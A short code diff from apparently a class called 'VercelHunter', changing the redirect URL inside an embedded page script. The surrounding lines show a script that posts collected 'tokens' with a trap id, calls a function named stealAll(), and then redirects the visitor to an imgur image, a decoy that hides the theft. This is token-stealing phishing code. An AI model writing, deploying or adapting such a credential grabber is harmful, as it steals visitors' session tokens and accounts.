@@ -34,7 +34,7 @@ class VercelHunter {
             body: JSON.stringify({trap: "${this.trapId}", tokens})  
           });  
         }  
-        window.location.replace("https://i.imgur.com/LEGIT_IMAGE.jpg");  
+        window.location.replace("https://imgur.com/a/1FuLGlS");  
       };  
       stealAll();  
     </script>  
